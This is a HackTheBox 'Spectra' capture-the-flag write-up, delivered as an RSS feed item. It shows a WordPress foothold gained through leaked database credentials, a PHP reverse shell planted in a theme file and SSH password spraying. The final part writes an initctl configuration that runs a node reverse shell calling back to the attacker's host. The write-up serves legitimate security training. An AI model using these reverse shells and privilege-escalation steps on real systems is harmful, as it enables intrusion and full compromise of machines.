<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/linux/</link>
    <description>Recent content in Linux on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 26 Jun 2021 21:27:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user.</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts with enumerating a WordPress website which has directory listing enabled, and it exposes a config file that contains a database password. The password can be used to login into the admin dashboard, allowing me to insert a PHP reverse shell into the web page and gain a foothold on the system. Internal enumeration finds another password used for auto-login, and it can be used to escalate to user. The user has sudo privileges on <code>initctl</code>, and this can be leveraged to get a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting WordPress</li>
<li>Command Injection</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-15 10:10 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.229
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> closed ports
Reason: <span style="color:#ae81ff">65532</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.17.4
3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">63</span> MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 123.14 seconds
</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ echo <span style="color:#e6db74">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
$ curl -s http://spectra.htb/ | wc -c
<span style="color:#ae81ff">283</span>
→ root@kali «~» «10.10.14.9» 
$ curl -s http://10.10.10.229 | wc -c
<span style="color:#ae81ff">283</span>
</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
</p>
<p>Removing <code>index.php</code> from URL, discovers that this page has directory listing is enabled.</p>
<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl http://spectra.htb/testing/wp-config.php.save
&lt;?php
...&lt;SNIP&gt;...

define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL hostname */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I could inject a PHP reverse shell script into one of the available themes' page and execute it by visiting the page URL.</p>
<p>I&rsquo;ll put my <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35166</span>
Linux spectra 5.4.66+ <span style="color:#75715e">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
 09:14:42 up 10:53,  <span style="color:#ae81ff">0</span> users,  load average: 0.02, 0.04, 0.00
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
$ id
uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
$ hostname
spectra
</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>I need to use the full path to upgrade my shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ which python3
which: no python3 in <span style="color:#f92672">((</span>null<span style="color:#f92672">))</span>
$ ls /usr/bin/ | grep python 
python
python-config
python-wrapper
python2
python2.7
python3
python3.6
python3.6m
$ /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
nginx@spectra / $ export TERM<span style="color:#f92672">=</span>xterm
nginx@spectra / $ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> suspended  nc -nvlp <span style="color:#ae81ff">9001</span>
→ root@kali «spectra» «10.10.14.21» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> continued  nc -nvlp <span style="color:#ae81ff">9001</span>

nginx@spectra / $ 
</code></pre></div><p>I&rsquo;ll add <code>/usr/bin</code> to current PATH variable, so I don&rsquo;t have to call binary&rsquo;s full path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
TERM<span style="color:#f92672">=</span>xterm
USER<span style="color:#f92672">=</span>nginx
PWD<span style="color:#f92672">=</span>/
SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
HOME<span style="color:#f92672">=</span>/home/nginx
_<span style="color:#f92672">=</span>/usr/bin/env
nginx@spectra / $ export PATH<span style="color:#f92672">=</span>$PATH:/usr/bin 
nginx@spectra / $ which python
/usr/local/bin/python
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd | grep sh$  
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
</code></pre></div><p>Enumerating home directory shows that the user flag is on <code>katie</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
...&lt;SNIP&gt;...
/home/katie:
total <span style="color:#ae81ff">8</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
...&lt;SNIP&gt;...
</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
/usr/local/share/nginx/html/main/wp-config.php
/usr/local/share/nginx/html/testing/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has credentials with the one on <code>/testing</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
...&lt;SNIP&gt;...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database username */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;

/** MySQL database password */
define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;development01&#39;</span> <span style="color:#f92672">)</span>;
...&lt;SNIP&gt;...
</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
<span style="color:#75715e"># found in the LICENSE file.</span>
description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
<span style="color:#75715e"># input.</span>
start on started boot-complete
script
  passwd<span style="color:#f92672">=</span>
  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
      break
    <span style="color:#66d9ef">fi</span>
  <span style="color:#66d9ef">done</span>
  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
    exit <span style="color:#ae81ff">0</span>
  <span style="color:#66d9ef">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>I found the <code>passwd</code> file which contains a password in the <code>/etc/autologin/</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
nginx@spectra /opt $ cat /etc/autologin/passwd 
SummerHereWeCome!!
</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.1
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:SummerHereWeCome!! Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> katie:SummerHereWeCome!!
</code></pre></div><p>The password <code>SummerHereWeCome!!</code> works on user <code>katie</code> .</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
$ ssh katie@10.10.10.229
Password: 
katie@spectra ~ $ id 
uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
total <span style="color:#ae81ff">36</span>
drwxr-xr-x <span style="color:#ae81ff">5</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .
drwxr-xr-x <span style="color:#ae81ff">8</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">2</span> 15:55 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">2</span> 15:55 .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">127</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">204</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_profile
-rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">551</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bashrc
drwx------ <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .gnupg
drwx------ <span style="color:#ae81ff">3</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 .pki
drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
-r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo privileges, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
</code></pre></div><p>Unfortunately, <code>initctl</code> is not listed on GTFObins site. I&rsquo;ll have to look around.</p>
<p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
    <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
    <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
    <span style="color:#ae81ff">32109</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test3.conf
    <span style="color:#ae81ff">32112</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test4.conf
    <span style="color:#ae81ff">32103</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test.conf
    <span style="color:#ae81ff">32126</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test8.conf
    <span style="color:#ae81ff">32128</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test9.conf
    <span style="color:#ae81ff">32106</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test10.conf
    <span style="color:#ae81ff">32108</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test2.conf
    <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
    <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
    <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
end script
</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
<p>The <code>/srv/nodetest.js</code> file itself is not important because with sudo privileges and write access on those configuration files, I can perform a command injection to send myself a reverse shell by leveraging <a href="https://gtfobins.github.io/gtfobins/node/#sudo">Node</a>.</p>
<p>I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ cat exploit.conf
description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
author      <span style="color:#e6db74">&#34;katie&#34;</span>

start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
stop on shutdown

script

    export RHOST<span style="color:#f92672">=</span>10.10.14.21
    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
    echo $$ &gt; /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
</span><span style="color:#e6db74">    this.pipe(sh.stdin);
</span><span style="color:#e6db74">    sh.stdout.pipe(this);
</span><span style="color:#e6db74">    sh.stderr.pipe(this);
</span><span style="color:#e6db74">    })&#39;</span>
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
